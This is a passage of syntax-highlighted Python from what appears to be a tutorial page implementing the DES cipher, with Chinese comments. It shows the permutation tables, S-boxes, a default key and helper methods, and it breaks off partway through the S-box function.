class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>,</span><br><span class="line">        ]  <span class="comment"># E置换，将32位明文置换位48位</span></span><br><span class="line">        self.P = [</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># P置换，对经过S盒之后的数据再次进行置换</span></span><br><span class="line">        <span class="comment"># 设置默认密钥</span></span><br><span class="line">        self.K = <span class="string">&#x27;0111010001101000011010010111001101101001011100110110100101110110&#x27;</span></span><br><span class="line">        self.k1 = [</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">            <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        ]  <span class="comment"># 密钥的K1初始置换</span></span><br><span class="line">        self.k2 = [</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">            <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">            <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>,</span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        self.k0 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, ]  <span class="comment"># 秘钥循环移位的位数</span></span><br><span class="line"> </span><br><span class="line">        self.S = [</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x5</span>, <span class="number">0x0</span>,</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xb</span>, <span class="number">0x5</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xe</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xe</span>,</span><br><span class="line">                <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x3</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xb</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]  <span class="comment"># 16进制表示S盒的数据，S盒是为了将48位转换为32位，有8个盒子</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__substitution</span>(<span class="params">self, table: <span class="built_in">str</span>, self_table: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param table: 需要进行置换的列表,是一个01字符串</span></span><br><span class="line"><span class="string">        :param self_table: 置换表，在__init__中初始化了</span></span><br><span class="line"><span class="string">        :return: 返回置换后的01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        sub_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self_table:</span><br><span class="line">            sub_result += table[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> sub_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2bin</span>(<span class="params">self, string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将明文转为二进制字符串:</span></span><br><span class="line"><span class="string">        :param string: 任意字符串</span></span><br><span class="line"><span class="string">        :return:二进制字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        plaintext_list = <span class="built_in">list</span>(<span class="built_in">bytes</span>(string, <span class="string">&#x27;utf8&#x27;</span>))  <span class="comment"># 将字符串转成bytes类型，再转成list</span></span><br><span class="line">        result = []  <span class="comment"># 定义返回结果</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> plaintext_list:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))  <span class="comment"># 将列表的每个元素转成二进制字符串，8位宽度</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bin2str</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        二进制字符串转成字符串</span></span><br><span class="line"><span class="string">        :param binary:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))  <span class="comment"># 对二进制转成int</span></span><br><span class="line">        result = <span class="built_in">bytes</span>(list_int).decode()  <span class="comment"># 将列表转成bytes，在进行解码，得到字符串</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bin2int</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        由于加密之后的二进制无法直接转成字符，有不可见字符在，utf8可能无法解码，所以需要将二进制字符串每8位转成int型号列表，用于转成bytes再转hex</span></span><br><span class="line"><span class="string">        :param binary: 二进制字符串</span></span><br><span class="line"><span class="string">        :return: int型列表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> list_int</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__int2bin</span>(<span class="params">self, list_int: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> list_int:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_block_list</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        对明文二进制串进行切分，每64位为一块，DES加密以64位为一组进行加密的</span></span><br><span class="line"><span class="string">        :type binary: 二进制串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        len_binary = <span class="built_in">len</span>(binary)</span><br><span class="line">        <span class="keyword">if</span> len_binary % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">            binary_block = binary + (<span class="string">&quot;0&quot;</span> * (<span class="number">64</span> - (len_binary % <span class="number">64</span>)))</span><br><span class="line">            <span class="keyword">return</span> [binary_block[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_block), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> [binary[j:j + <span class="number">64</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">64</span>)]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_secretkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        修改默认密钥函数</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前二进制形式密钥为:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字符串形式密钥为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.bin2str(self.K)))</span><br><span class="line">        newkey = <span class="built_in">input</span>(<span class="string">&quot;输入新的密钥（长度为8）：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(newkey) != <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥长度不符合，请重新输入：&quot;</span>)</span><br><span class="line">            self.modify_secretkey()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_key = self.str2bin(newkey)</span><br><span class="line">            self.K = bin_key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前二进制形式密钥为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__f_funtion</span>(<span class="params">self, right: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param right: 明文二进制的字符串加密过程的右半段</span></span><br><span class="line"><span class="string">        :param key: 当前轮数的密钥</span></span><br><span class="line"><span class="string">        :return: 进行E扩展，与key异或操作，S盒操作后返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 对right进行E扩展</span></span><br><span class="line">        e_result = self.__substitution(right, self.E)</span><br><span class="line">        <span class="comment"># 与key 进行异或操作</span></span><br><span class="line">        xor_result = self.__xor_function(e_result, key)</span><br><span class="line">        <span class="comment"># 进入S盒子</span></span><br><span class="line">        s_result = self.__s_box(xor_result)</span><br><span class="line">        <span class="comment"># 进行P置换</span></span><br><span class="line">        p_result = self.__substitution(s_result, self.P)</span><br><span class="line">        <span class="keyword">return</span> p_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_key_list</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 返回加密过程中16轮的子密钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = self.__substitution(self.K, self.k1)</span><br><span class="line">        left_key = key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        right_key = key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            move = self.k0[i - <span class="number">1</span>]</span><br><span class="line">            move_left = left_key[move:<span class="number">28</span>] + left_key[<span class="number">0</span>:move]</span><br><span class="line">            move_right = right_key[move:<span class="number">28</span>] + right_key[<span class="number">0</span>:move]</span><br><span class="line">            left_key = move_left</span><br><span class="line">            right_key = move_right</span><br><span class="line">            move_key = left_key + right_key</span><br><span class="line">            ki = self.__substitution(move_key, self.k2)</span><br><span class="line">            keys.append(ki)</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor_function</span>(<span class="params">self, xor1: <span class="built_in">str</span>, xor2: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor1: 01字符串</span></span><br><span class="line"><span class="string">        :param xor2: 01字符串</span></span><br><span class="line"><span class="string">        :return: 异或操作返回的结果</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        size = <span class="built_in">len</span>(xor1)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size):</span><br><span class="line">            result += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> xor1[i] == xor2[i] <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__s_box</span>(<span class="params">self, xor_result: <span class="built_in">str</span></span>):</span><br><span class="line">        <span 